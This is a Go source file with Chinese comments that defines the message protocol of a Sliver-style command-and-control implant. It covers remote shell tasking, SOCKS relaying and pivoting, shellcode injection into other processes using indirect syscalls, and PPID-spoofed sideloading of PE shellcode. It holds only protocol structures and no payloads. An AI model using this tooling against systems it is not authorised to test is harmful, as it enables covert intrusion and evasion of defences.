package protocol

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"time"
)

// Envelope 是 Agent 和 Server 之间所有通信的容器结构。
// 借鉴 Sliver 的 envelope 设计：每次通信都携带时间戳和 Nonce，
// 用于重放攻击防护。Payload 使用 AES-256-GCM 加密。
type Envelope struct {
	Timestamp int64  `json:"timestamp"` // Unix 毫秒时间戳
	AgentID   string `json:"agent_id"`  // Agent 唯一标识
	Type      string `json:"message_type"`
	Payload   []byte `json:"payload"`  // AES-GCM 加密后的载荷
	Nonce     []byte `json:"nonce"`    // 12-byte 随机 Nonce（AES-GCM 标准大小）
	Signature string `json:"signature,omitempty"` // HMAC-SHA256 签名（hex 编码）
}

// Sign 对 Envelope 计算 HMAC-SHA256 签名。
// 签名覆盖 timestamp + agent_id + type + payload + nonce，
// 确保消息完整性和来源认证。
func (e *Envelope) Sign(key []byte) {
	mac := hmac.New(sha256.New, key)
	mac.Write([]byte(e.Type))
	mac.Write([]byte(e.AgentID))
	ts := make([]byte, 8)
	binary.BigEndian.PutUint64(ts, uint64(e.Timestamp))
	mac.Write(ts)
	mac.Write(e.Nonce)
	mac.Write(e.Payload)
	e.Signature = hex.EncodeToString(mac.Sum(nil))
}

// Verify 验证 Envelope 的 HMAC 签名。
func (e *Envelope) Verify(key []byte) bool {
	if e.Signature == "" {
		return false
	}

	mac := hmac.New(sha256.New, key)
	mac.Write([]byte(e.Type))
	mac.Write([]byte(e.AgentID))
	ts := make([]byte, 8)
	binary.BigEndian.PutUint64(ts, uint64(e.Timestamp))
	mac.Write(ts)
	mac.Write(e.Nonce)
	mac.Write(e.Payload)

	expected := hex.EncodeToString(mac.Sum(nil))
	return hmac.Equal([]byte(e.Signature), []byte(expected))
}

// MessageType 定义了所有可能的消息类型。
const (
	TypeRegister   = "register"
	TypeRegisterOK = "register_ok"
	TypeHeartbeat  = "heartbeat"
	TypeTask       = "task"
	TypeResult     = "result"
	TypeAck        = "ack"
)

// RegisterPayload 是 Agent 首次注册时发送的载荷。
type RegisterPayload struct {
	AgentID    string `json:"agent_id"`
	Hostname   string `json:"hostname"`
	OS         string `json:"os"`
	Arch       string `json:"arch"`
	Username   string `json:"username"`
	PID        int    `json:"pid"`
	PubKeyPEM  []byte `json:"pub_key_pem"`  // Agent 的 RSA 公钥（PEM 格式，向后兼容）
	AESKeyEnc  []byte `json:"aes_key_enc"`  // 用 Server RSA 公钥加密的 AES-256 密钥（向后兼容）
	// X25519 ECDH 字段（新协议，替代 RSA）
	ECDHPubKey []byte `json:"ecdh_pub_key"` // Agent 的 X25519 临时公钥（32 字节）
}

// HeartbeatPayload 是心跳保活载荷。
type HeartbeatPayload struct {
	AgentID string `json:"agent_id"`
	SeqNum  uint64 `json:"seq_num"`  // 心跳序列号
}

// TaskPayload 是 Server 下发给 Agent 的任务。
type TaskPayload struct {
	TaskID    string `json:"task_id"`
	Command   string `json:"command"`    // 命令类型：shell, info, ls, cat, process...
	Args      string `json:"args"`       // 命令参数
	Timeout   int    `json:"timeout"`    // 超时秒数
	Priority  int    `json:"priority"`   // 1-5，5 为最高
	AuditTag  string `json:"audit_tag"`  // 审计标签
}

// ResultPayload 是 Agent 执行任务后回传的结果。
type ResultPayload struct {
	TaskID    string `json:"task_id"`
	AgentID   string `json:"agent_id"`
	Status    string `json:"status"`     // success | failed | timeout
	Stdout    []byte `json:"stdout"`
	Stderr    []byte `json:"stderr"`
	ExitCode  int    `json:"exit_code"`
	Duration  time.Duration `json:"duration"`
}

// AckPayload 是确认回执。
type AckPayload struct {
	TaskID string `json:"task_id"`
	Status string `json:"status"`
}

// SOCKS 消息类型（用于 Server ↔ Agent 的 SOCKS 数据中继）。
const (
	TypeSocksConnect = "socks_connect" // Server → Agent: 建立到 target:port 的连接
	TypeSocksData    = "socks_data"    // 双向: 携带 SOCKS 会话数据
	TypeSocksClose   = "socks_close"   // Server → Agent: 关闭指定会话
)

// SocksConnectPayload 是建立 SOCKS 会话的请求。
type SocksConnectPayload struct {
	SessionID string `json:"session_id"`
	Target    string `json:"target"`
	Port      int    `json:"port"`
}

// SocksDataPayload 是 SOCKS 会话数据。
type SocksDataPayload struct {
	SessionID string `json:"session_id"`
	Data      []byte `json:"data"` // base64 编码的原始数据
	Closed    bool   `json:"closed"` // 发送方已关闭连接
}

// SocksClosePayload 是关闭 SOCKS 会话的请求。
type SocksClosePayload struct {
	SessionID string `json:"session_id"`
}

// Pivot 消息类型（用于 Server ↔ Agent 的 Pivot 监听器管理）。
const (
	TypePivotCreate = "pivot_create" // Server → Agent: 创建 Pivot 监听器
	TypePivotStart  = "pivot_start"  // Server → Agent: 启动指定监听器
	TypePivotStop   = "pivot_stop"   // Server → Agent: 停止指定监听器
	TypePivotAccept = "pivot_accept" // Agent → Server: 新连接已建立
	TypePivotData   = "pivot_data"   // 双向: Pivot 会话数据
	TypePivotClose  = "pivot_close"  // 双向: 关闭指定 Pivot 会话
)

// PivotCreatePayload 是创建 Pivot 监听器的请求。
type PivotCreatePayload struct {
	ListenerID string `json:"listener_id"`
	Type       string `json:"type"` // "tcp" | "named_pipe"
	BindAddr   string `json:"bind_addr"`
}

// PivotAcceptPayload 是 Agent 通知 Server 有新 Pivot 连接。
type PivotAcceptPayload struct {
	ListenerID string `json:"listener_id"`
	SessionID  string `json:"session_id"`
	SrcAddr    string `json:"src_addr"`
}

// PivotDataPayload 是 Pivot 会话的双向数据传输。
type PivotDataPayload struct {
	ListenerID string `json:"listener_id"`
	SessionID  string `json:"session_id"`
	Data       []byte `json:"data"`
}

// PivotClosePayload 是关闭 Pivot 会话的请求。
type PivotClosePayload struct {
	ListenerID string `json:"listener_id"`
	SessionID  string `json:"session_id"`
}

// Interactive Shell 消息类型.
const (
	TypeShellCreate = "shell_create" // Server → Agent: 创建交互式 shell
	TypeShellWrite  = "shell_write"  // Server → Agent: 写入 stdin
	TypeShellRead   = "shell_read"   // Server → Agent: 读取 stdout
	TypeShellClose  = "shell_close"  // Server → Agent: 关闭 shell
	TypeShellData   = "shell_data"   // Agent → Server: shell 输出数据
)

// ShellCreatePayload 是创建交互式 shell 的请求.
type ShellCreatePayload struct {
	Shell string `json:"shell,omitempty"` // shell 路径，空=默认
}

// ShellWritePayload 是向 shell 写入数据的请求.
type ShellWritePayload struct {
	SessionID string `json:"session_id"`
	Data      []byte `json:"data"`
}

// ShellReadPayload 是读取 shell 输出的请求.
type ShellReadPayload struct {
	SessionID string `json:"session_id"`
	MaxBytes  int    `json:"max_bytes"`
}

// ShellClosePayload 是关闭 shell 的请求.
type ShellClosePayload struct {
	SessionID string `json:"session_id"`
}

// ShellDataPayload 是 Agent 返回的 shell 输出.
type ShellDataPayload struct {
	SessionID string `json:"session_id"`
	Data      []byte `json:"data"`
	Closed    bool   `json:"closed"`
}

// Job 消息类型（后台任务管理）.
const (
	TypeJobStart = "job_start" // Server → Agent: 启动后台任务
	TypeJobStop  = "job_stop"  // Server → Agent: 停止任务
	TypeJobKill  = "job_kill"  // Server → Agent: 强制终止任务
	TypeJobList  = "job_list"  // Server → Agent: 列出所有任务
)

// JobStartPayload 是启动后台任务的请求.
type JobStartPayload struct {
	JobType string            `json:"job_type"` // port_forward, rport_forward, http_listener, ...
	Args    map[string]string `json:"args"`
}

// JobStopPayload 是停止任务的请求.
type JobStopPayload struct {
	JobID string `json:"job_id"`
}

// JobKillPayload 是强制终止任务的请求.
type JobKillPayload struct {
	JobID string `json:"job_id"`
}

// Migrate 消息类型（进程迁移）.
const (
	TypeMigrate      = "migrate"      // Server → Agent: 携带 shellcode 注入目标进程
	TypeMigrateOK    = "migrate_ok"   // Agent → Server: 迁移成功
	TypeMigrateFail  = "migrate_fail" // Agent → Server: 迁移失败
)

// MigratePayload 是进程迁移的请求.
type MigratePayload struct {
	PID       int    `json:"pid"`        // 目标进程 PID
	Shellcode []byte `json:"shellcode"`  // 要注入的 shellcode（完整 agent 镜像）
	UseSyscall bool  `json:"use_syscall"` // 是否使用间接 syscall
}

// MigrateResult 是进程迁移的结果.
type MigrateResult struct {
	Success bool   `json:"success"`
	PID     int    `json:"pid"`
	Message string `json:"message"`
}

// Sideload 消息类型（PPID 欺骗 + PE 加载）.
const (
	TypeSideload = "sideload" // Server → Agent: 以 PPID 欺骗方式加载 PE shellcode
)

// SideloadPayload 是 sideload 加载的请求.
type SideloadPayload struct {
	ProcessName string `json:"process_name"` // 要创建的进程（用于注入）
	ProcessArgs string `json:"process_args"` // 进程参数
	PPID        int    `json:"ppid"`         // 伪造的父进程 PID
	Shellcode   []byte `json:"shellcode"`    // PE 转换的 shellcode（Donut）
	Kill        bool   `json:"kill"`         // 执行完成后是否终止进程
}
